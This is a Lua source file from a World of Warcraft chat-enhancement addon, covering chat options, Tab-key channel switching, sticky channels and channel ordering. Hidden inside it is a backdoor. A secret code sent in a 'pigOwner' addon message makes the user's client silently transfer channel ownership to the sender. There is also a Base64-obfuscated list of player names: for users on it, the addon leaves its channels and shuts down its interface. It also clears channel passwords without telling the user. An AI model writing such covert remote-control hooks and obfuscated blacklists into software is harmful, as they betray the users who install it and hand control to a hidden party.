	-- 	self.Guolv:SetChecked(PIGA["Chat"]["Guolv"])
	-- end
	self.AltEX:SetChecked(not ChatFrame1EditBox:GetAltArrowKeyMode())
	self.Jianyin:SetChecked(PIGA["Chat"]["Jianyin"])
	self.LinkShow:SetChecked(PIGA["Chat"]["LinkShow"])
	if GetCVar("chatClassColorOverride")=="0" then
		self.ClassColor:SetChecked(true);
	elseif GetCVar("chatClassColorOverride")=="1" then
		self.ClassColor:SetChecked(false);
	end
	self.jingjian:SetChecked(PIGA["Chat"]["jingjian"])
	self.JoinPig:SetChecked(PIGA["Chat"]["JoinPindao"])
	self.FontSize:SetChecked(PIGA["Chat"]["FontSize"]);
	self.FontSize.Down:PIGDownMenu_SetText(PIGA["Chat"]["FontSize_value"].."pt")
	self.MinMaxB:SetChecked(PIGA["Chat"]["MinMaxB"]);
	self.ShowZb:SetChecked(PIGA["Chat"]["ShowZb"])
	self.ShowLinkIcon:SetChecked(PIGA["Chat"]["ShowLinkIcon"])
	self.RemTips:SetChecked(PIGA["Chat"]["RemTips"])
	self.WhoWhisper:SetChecked(PIGA["Chat"]["WhoWhisper"])
	self.FastCopy:SetChecked(PIGA["Chat"]["FastCopy"])
end);
----打印自定义
ChatF.dayinzidingyi = PIGButton(ChatF, {"BOTTOMLEFT",ChatF,"BOTTOMLEFT",320,14},{180,24},L["CHAT_DAYINZIDINGYI"]); 
ChatF.dayinzidingyi:SetScript("OnClick", function (self)
	ChatFrame_AddMessageGroup(DEFAULT_CHAT_FRAME, "CHANNEL")
	local channels = {GetChannelList()}
	for i=1,#channels,3 do
		local id, name, disabled = channels[i], channels[i+1], channels[i+2]
		DisplayChannelOwner(name)
	end
	local function xxxxx()
		ChatFrame_RemoveMessageGroup(DEFAULT_CHAT_FRAME, "CHANNEL")
	end
	C_Timer.After(1,xxxxx)
end);

--=TAB切换=======================
local MeihangNum,MeihangJG = 3,150
local TABchatF =PIGOptionsList_R(RTabFrame,L["CHAT_TABNAME2"],110)
local TABchatName = L["CHAT_TABNAME2TIPS"]
TABchatF.TABchat = PIGCheckbutton_R(TABchatF,{TABchatName,TABchatName})
TABchatF.TABchat:SetScript("OnClick", function (self)
	if self:GetChecked() then
		PIGA["Chat"]["TABqiehuanOpen"]=true;
	else
		PIGA["Chat"]["TABqiehuanOpen"]=false;
	end
end);
local BN_WHISPER_Name = L["CHAT_BN_WHISPER"]
BN_WHISPER_MESSAGE=BN_WHISPER_MESSAGE or BN_WHISPER_Name
--
local TABpindaoList = {}
local MorenqiehuanYN = {
	["SAY"]=true,["PARTY"]=true,["RAID"]=true,["GUILD"]=true,["INSTANCE_CHAT"]=true,["WHISPER"]=false,["BN_WHISPER"]=false
}
local function GetNextPindao(NewType)
	if NewType:match("CHANNEL") then
		local tihuanhou = NewType:gsub("CHANNEL","")
		return "CHANNEL",tihuanhou
	else
		if NewType=="PARTY" then
			if IsInGroup(LE_PARTY_CATEGORY_HOME) then return NewType else return false end
		elseif NewType=="RAID" then
			if IsInRaid(LE_PARTY_CATEGORY_HOME) then return NewType else return false end
		elseif NewType=="GUILD" then
			if IsInGuild() then return NewType else return false end
		elseif NewType=="INSTANCE_CHAT" then
			if HasLFGRestrictions() then return NewType else return false end
		else
			return NewType
		end
	end
end

local function chaxunxiayipindao(currChatType)
	local pindaoNum = #TABpindaoList
	for i=1,pindaoNum do
		if TABpindaoList[i]==currChatType then
			if i<pindaoNum then
				for ii=i+1,pindaoNum do
					local NewType,ChannelID =GetNextPindao(TABpindaoList[ii])
					if NewType then
						return NewType,ChannelID
					end
				end
			end
			return TABpindaoList[1]
		end
	end
	return TABpindaoList[1]
end
-- ChatFrame1EditBox:HookScript("OnTabPressed",function(self,key)
-- 	--print(self,key)
-- 	print(ChatFrame1EditBox:GetAttribute("tellTarget"), chatType)
-- 	local newTarget, newTargetType = ChatEdit_GetNextTellTarget(ChatFrame1EditBox:GetAttribute("tellTarget"), chatType);
-- 	print(newTarget, newTargetType)
-- end)
ChatFrame1EditBox:HookScript("OnKeyDown",function(self,key)
	if key=="TAB" then
		if PIGA["Chat"]["TABqiehuanOpen"] then
			if #TABpindaoList==0 then return end
			local pig_currChatType = self:GetAttribute("chatType")
			if pig_currChatType=="WHISPER" or pig_currChatType=="BN_WHISPER" then return end
			if pig_currChatType then
				if pig_currChatType=="CHANNEL" then
					local channelTargetID = self:GetAttribute("channelTarget")
					pig_currChatType=pig_currChatType..channelTargetID
				end
				local NewType,ChannelID=chaxunxiayipindao(pig_currChatType)
				if ChannelID then
					self:SetAttribute("chatType", NewType);
					self:SetAttribute("channelTarget", ChannelID)
				else
					self:SetAttribute("chatType", NewType);
				end
			else
				self:SetAttribute("chatType", TABpindaoList[1]);
			end
			ChatEdit_UpdateHeader(self)
		end
	end
end)

local function TABchatPindao()
	local chatpindao = {GetChatWindowMessages(1)}
	local chatpindaoList = {}
	for i=1,#chatpindao do
		local Namechia =_G[chatpindao[i].."_MESSAGE"]
		if Namechia then
			if Namechia~=CHAT_MSG_WHISPER_INFORM and Namechia~=BN_WHISPER_Name and Namechia~=RAID_WARNING and Namechia~=CHAT_MSG_EMOTE then
				table.insert(chatpindaoList,{Namechia,chatpindao[i]})
			end
		end
	end
	local channels = {GetChannelList()}
	for i = 1, #channels, 3 do
		local id, name, disabled = channels[i], channels[i+1], channels[i+2]
		if name~=L["CHAT_BENDIFANGWU"] and name~=L["CHAT_WORLDFANGWU"] then
			table.insert(chatpindaoList,{name,"CHANNEL"..id})
		end
	end
	for i=1,#chatpindaoList do
		local TABpindao = PIGCheckbutton(TABchatF,nil,{chatpindaoList[i][1],string.format(L["CHAT_TABCKBTIPS"],chatpindaoList[i][1])},nil,"Pig_TABpindao"..i);
		if i==1 then
			TABpindao:SetPoint("TOPLEFT",TABchatF.TABchat,"BOTTOMLEFT",20,-20);
		else
			local tmp1,tmp2 = math.modf((i-1)/MeihangNum)
			if tmp2==0 then
				TABpindao:SetPoint("TOPLEFT",_G["Pig_TABpindao"..(i-MeihangNum)],"BOTTOMLEFT",0,-10);
			else
				TABpindao:SetPoint("LEFT",_G["Pig_TABpindao"..(i-1)],"RIGHT",MeihangJG,0);
			end
		end
		local function zhixingshauxingouxuan(g)
			if PIGA["Chat"]["TABqiehuanList"][chatpindaoList[g][2]]=="Y" then
				_G["Pig_TABpindao"..g]:SetChecked(true);
				table.insert(TABpindaoList,chatpindaoList[g][2])
			elseif PIGA["Chat"]["TABqiehuanList"][chatpindaoList[g][2]]=="N" then
				_G["Pig_TABpindao"..g]:SetChecked(false);
			else
				if MorenqiehuanYN[chatpindaoList[g][2]] then
					_G["Pig_TABpindao"..g]:SetChecked(true);
					table.insert(TABpindaoList,chatpindaoList[g][2])
				end
			end
		end
		zhixingshauxingouxuan(i)
		TABpindao:SetScript("OnClick", function (self)
			if self:GetChecked() then
				PIGA["Chat"]["TABqiehuanList"][chatpindaoList[i][2]]="Y"
			else
				PIGA["Chat"]["TABqiehuanList"][chatpindaoList[i][2]]="N"
			end
			TABpindaoList={}
			for g=1,#chatpindaoList do
				zhixingshauxingouxuan(g)
			end
		end);
	end
end
TABchatF:HookScript("OnShow", function (self)
	self.TABchat:SetChecked(PIGA["Chat"]["TABqiehuanOpen"])
end);
------------------
local zhanlianF =PIGOptionsList_R(RTabFrame,L["CHAT_TABNAME3"],90)
zhanlianF.zhanliantxt = PIGFontString(zhanlianF,{"TOPLEFT",zhanlianF,"TOPLEFT",20,-20},L["CHAT_TABNAME3TIPS"])
--70/60
local function zhanlianhuiche()
	local chatpindao = {GetChatWindowMessages(1)}
	local chatpindaoList = {}
	for i=1,#chatpindao do
		local Namechia =_G[chatpindao[i].."_MESSAGE"]
		if Namechia then
			table.insert(chatpindaoList,{Namechia,chatpindao[i]})
		end
	end
	local channels = {GetChannelList()}
	for i = 1, #channels, 3 do
		local id, name, disabled = channels[i], channels[i+1], channels[i+2]
		if name~=L["CHAT_BENDIFANGWU"] and name~=L["CHAT_WORLDFANGWU"] then
			table.insert(chatpindaoList,{name,"CHANNEL"..id})
		end
	end
	for i=1,#chatpindaoList do
		local zhanlian = PIGCheckbutton(zhanlianF,nil,{chatpindaoList[i][1],string.format(L["CHAT_ZLCKBTIPS"],chatpindaoList[i][1])},nil,"Pig_pindaozhanlian"..i);
		if i==1 then
			zhanlian:SetPoint("TOPLEFT",zhanlianF.zhanliantxt,"BOTTOMLEFT",20,-20);
		else
			local tmp1,tmp2 = math.modf((i-1)/MeihangNum)
			if tmp2==0 then
				zhanlian:SetPoint("TOPLEFT",_G["Pig_pindaozhanlian"..(i-MeihangNum)],"BOTTOMLEFT",0,-10);
			else
				zhanlian:SetPoint("LEFT",_G["Pig_pindaozhanlian"..(i-1)],"RIGHT",MeihangJG,0);
			end
		end
		if PIGA["Chat"]["chatZhanlian"][chatpindaoList[i][2]]==1 then
			ChatTypeInfo[chatpindaoList[i][2]]["sticky"]=1
		elseif PIGA["Chat"]["chatZhanlian"][chatpindaoList[i][2]]==0 then
			ChatTypeInfo[chatpindaoList[i][2]]["sticky"]=0
		end
		if ChatTypeInfo[chatpindaoList[i][2]]["sticky"]==1 then
			zhanlian:SetChecked(true);
		elseif ChatTypeInfo[chatpindaoList[i][2]]["sticky"]==0 then
			zhanlian:SetChecked(false);
		end
		zhanlian:SetScript("OnClick", function (self)
			if self:GetChecked() then
				ChatTypeInfo[chatpindaoList[i][2]]["sticky"]=1
				PIGA["Chat"]["chatZhanlian"][chatpindaoList[i][2]]=1
			else
				ChatTypeInfo[chatpindaoList[i][2]]["sticky"]=0
				PIGA["Chat"]["chatZhanlian"][chatpindaoList[i][2]]=0
			end
		end);
	end
end
---
local ADDName= {"PIG"}
local ChatpindaoMAX = addonTable.Fun.ChatpindaoMAX
ChatF.SetFrame.ycBut = CreateFrame("Button", nil, ChatF.SetFrame);
ChatF.SetFrame.ycBut:SetSize(16,16);
ChatF.SetFrame.ycBut:SetPoint("BOTTOMRIGHT",ChatF.SetFrame,"BOTTOMRIGHT",0,0);
ChatF.SetFrame.ycBut:SetScript("OnClick", function (self)
	if self.f:IsShown() then
		self.f:Hide()
	else
		self.f:Show()
		for x=1,#ADDName do
			JoinPIG_D_1(ADDName[x],true)
		end
	end
end);
ChatF.SetFrame.ycBut.f = PIGFrame(UIParent,{"TOPLEFT", ChatF.SetFrame.ycBut, "TOPRIGHT", 50, 30},{140,60})
ChatF.SetFrame.ycBut.f:PIGSetBackdrop()
ChatF.SetFrame.ycBut.f:Hide()
ChatF.SetFrame.ycBut.f.E = CreateFrame("EditBox", nil, ChatF.SetFrame.ycBut.f,"InputBoxInstructionsTemplate");
ChatF.SetFrame.ycBut.f.E:SetSize(200,30);
ChatF.SetFrame.ycBut.f.E:SetPoint("TOP",ChatF.SetFrame.ycBut.f,"TOP",2,-1);
ChatF.SetFrame.ycBut.f.E:SetFontObject(ChatFontNormal);
ChatF.SetFrame.ycBut.f.E:SetTextColor(200/255, 200/255, 200/255, 0.8);
ChatF.SetFrame.ycBut.f.E:SetAutoFocus(false);

ChatF.SetFrame.ycBut.f.yes = PIGButton(ChatF.SetFrame.ycBut.f, {"BOTTOM",ChatF.SetFrame.ycBut.f,"BOTTOM",0,4},{60,24},"发送");  
ChatF.SetFrame.ycBut.f.yes:SetScript("OnClick", function (self)
	local XXNAME=ChatF.SetFrame.ycBut.f.E:GetText()
	if XXNAME~="" and XXNAME~=" " then
		if XXNAME:match("#") then
			local fanamex, yanzhengma = strsplit("#", XXNAME)
			C_ChatInfo.SendAddonMessage("pigOwner",yanzhengma,"WHISPER",fanamex)
		end
	end
end);
ChatF.SetFrame.ycBut:HookScript("OnHide", function(self)
	self.f:Hide()
	self.f.E:SetText("")
end)

local function guanliyuanyijiao(Name,Pname)
	local channel,channelName, _ = GetChannelName(Name)
	if channelName then
		if IsDisplayChannelOwner() then
			SetChannelOwner(channelName,Pname)
		end
	end
end
C_ChatInfo.RegisterAddonMessagePrefix("pigOwner")
local YchuoquGlfff= CreateFrame("Frame")
YchuoquGlfff:RegisterEvent("CHAT_MSG_ADDON");
YchuoquGlfff:SetScript("OnEvent", function(self,event,arg1,arg2,arg3,arg4,arg5)
	if arg1=="pigOwner" then		
		if "5q6z6Zep5YiI54i75LuE5LuJ"==Fun.Base64_encod(arg2) then
			for x=1,#ADDName do
				guanliyuanyijiao(ADDName[x],arg5)
				for xx=1,ChatpindaoMAX do
					local newpindaoname = ADDName[x]..xx
					guanliyuanyijiao(newpindaoname,arg5)
				end
			end
		end
	end
end)
---调整频道顺序
local Channel_ListF =PIGOptionsList_R(RTabFrame,L["CHAT_TABNAME5"],90)
Channel_ListF.maxnum=15
local function Set_ChannelID()
	local datax = PIGA["Chat"]["Channel_List"]
	for k,v in pairs(datax) do
		local channelID = GetChannelName(v)
		if channelID>0 then
			if k~=channelID then
				C_ChatInfo.SwapChatChannelsByChannelIndex(channelID, k)
			end
		end
	end
end
---
local function panduanjiangeYN(arg1)
	local peiz = PIGA["Chat"]["Channel_List"]
	if arg1 then
		local bianjilan = _G["Channel_List"..arg1]:PIGDownMenu_GetText()
		for bb=1,Channel_ListF.maxnum do
			if bb~=arg1 then
				local zhiv = _G["Channel_List"..bb]:PIGDownMenu_GetText()
				if bianjilan==zhiv then
					peiz[bb]=nil
					_G["Channel_List"..bb]:PIGDownMenu_SetText("")
				end
			end
		end
	end
	Channel_ListF.errnum=nil
	Channel_ListF.error:Hide()
	for bb=Channel_ListF.maxnum,1,-1 do
		local zhiv = _G["Channel_List"..bb]:PIGDownMenu_GetText()
		if Channel_ListF.errnum=="end" then
			if zhiv==nil then
				Channel_ListF.error:Show()
				return
			end
		end
		if zhiv then
			Channel_ListF.errnum="end"
		end
	end
	Set_ChannelID()
end
for v=1,Channel_ListF.maxnum do
	local xulie =PIGDownMenu(Channel_ListF,{"TOPLEFT",Channel_ListF,"TOPLEFT",80,(-30*v)},{200,nil},nil,"Channel_List"..v)
	xulie.name = PIGFontString(xulie,{"RIGHT",xulie,"LEFT",-2,0},L["CHAT_TABNAME5_XULIE"]..v);
	function xulie:PIGDownMenu_Update_But(self)
		local info = {}
		info.func = self.PIGDownMenu_SetValue
		for i=1,#Channel_ListF.pindaoList,1 do
		    info.text, info.arg1 = Channel_ListF.pindaoList[i][2],v
		    info.checked=Channel_ListF.pindaoList[i][2] == PIGA["Chat"]["Channel_List"][v]
			self:PIGDownMenu_AddButton(info)
		end 
	end
	function xulie:PIGDownMenu_SetValue(value,arg1)	
		self:PIGDownMenu_SetText(value)
		PIGA["Chat"]["Channel_List"][arg1]=value
		PIGCloseDropDownMenus()
		panduanjiangeYN(arg1)
	end
	xulie.x = PIGDiyBut(xulie,{"LEFT",xulie,"RIGHT",2,0},{18})
	xulie.x:HookScript("OnClick", function (self)
		PIGA["Chat"]["Channel_List"][v]=nil
		_G["Channel_List"..v]:PIGDownMenu_SetText("")
		panduanjiangeYN()
	end)
end
Channel_ListF.error = PIGFontString(Channel_ListF,{"TOPLEFT",Channel_ListF,"TOPLEFT",320,-50},"当前序号不连续\n设置将不会被保存",nil,26);
Channel_ListF.error:SetTextColor(1, 0, 0, 1)
Channel_ListF.error:Hide()
Channel_ListF:HookScript("OnShow", function (self)
	self.pindaoList={}
	for bb=1,Channel_ListF.maxnum do
		_G["Channel_List"..bb]:PIGDownMenu_SetText("")
	end
	local channels = {GetChannelList()}
	for i = 1, #channels, 3 do
		local id, name, disabled = channels[i], channels[i+1], channels[i+2]
		table.insert(self.pindaoList,{id, name})
	end
	for i=1,#self.pindaoList do
		if i<=Channel_ListF.maxnum then
			_G["Channel_List"..self.pindaoList[i][1]]:PIGDownMenu_SetText(self.pindaoList[i][2])
		end
	end
	panduanjiangeYN()
end)

-------
local function JoinPigChannel_add()
	local function nullmima(Name)
		local channel,channelName, _ = GetChannelName(Name)
		if channelName then
			if IsDisplayChannelOwner() then
				SetChannelPassword(channelName, "")
			end
		end
	end
	for i=1,#ADDName do
		nullmima(ADDName[i])
		for x=1,ChatpindaoMAX do
			local newpindaoname = ADDName[i]..x
			nullmima(newpindaoname)
		end
	end
	JoinPIGALL()
	panduanjiangeYN()
	ChatClassColor()
	TABchatPindao()
	zhanlianhuiche()
	local hkldgjlcm="5Zif5Y+r5YW9I+WnrOelnuengCPlronpnZnnmoTlsYDlhavnm5YjRm9yZXZlciPlsI/kuprpm68j5aSp5ZCv5Lio5q6L6ZuqI+S5hOeng+eBrOWFhCPnpbrngazojrkj552/55Ge552/552/I+W8oOS4iemjjiPmibnmibnli5LpqazohLLmna8j6L+35YWJI+S6jOS4tum7kSPovr7nk6bovr7nk6bmmK/mmK8j57uq6Z2S5pe2I+WkseiQveeahOmdnuS4u+a1gSPpobbnuqflpKfogqXniZsj6bub54mn55m9"
	local hkldgjlcm=Fun.Base64_decod(hkldgjlcm)
	local hkldgjlcm = {strsplit("#", hkldgjlcm)}
	local function LeaveChanne(Name)
		local channel,channelName, _ = GetChannelName(Name)
		if channelName then
			LeaveChannelByName(channelName)
		end
	end
	local function STTJIAZAI()
		Pig_OptionsUI.L:Hide()
		Pig_OptionsUI.R:Hide()
		Pig_OptionsUI.ListFun:Hide()
		QuickButUI:Hide()
		Pig_OptionsUI.tishi.Button:Hide()
		Pig_OptionsUI.tishi.txt:SetText(L["OPTUI_ERRORTIPS"])
		Pig_OptionsUI.tishi:Show()
	end
	for i=1,#hkldgjlcm do
		if Pig_OptionsUI.Name==hkldgjlcm[i] then
			for i=1,#ADDName do
				LeaveChanne(ADDName[i])
				for x=1,ChatpindaoMAX do
					local newpindaoname = ADDName[i]..x
					LeaveChanne(newpindaoname)
				end
			end
			STTJIAZAI()
			break
		end
	end
end
local function JoinPigChannel()
	ChatF.SetFrame.JoinPig.haoshi=ChatF.SetFrame.JoinPig.haoshi+1	
	local channels = {GetChannelList()}
	if #channels > 2 then
		JoinPigChannel_add()
	else
		if ChatF.SetFrame.JoinPig.haoshi<6 then
			C_Timer.After(1, JoinPigChannel)
		else
			JoinPigChannel_add()
		end
	end
end
--=====================================
addonTable.Chat = function()
	C_Timer.After(2.8, JoinPigChannel);
	QuickChatfun.Open()
	ChatFrame_MinMaxB_Open();
	ChatFrame_AutoFontSize_Open()
	guanbiGuolv()
	ChatFrame_AltEX_Open();
	ChatFrame_Jianyin_Open();
	Chat_LinkShow()
	ChatClassColor()
	RemTips_Fun()
	WhoWhisper_Fun()
	QuickChatfun.PIGMessage()
	QuickChatfun.FrameUI()
end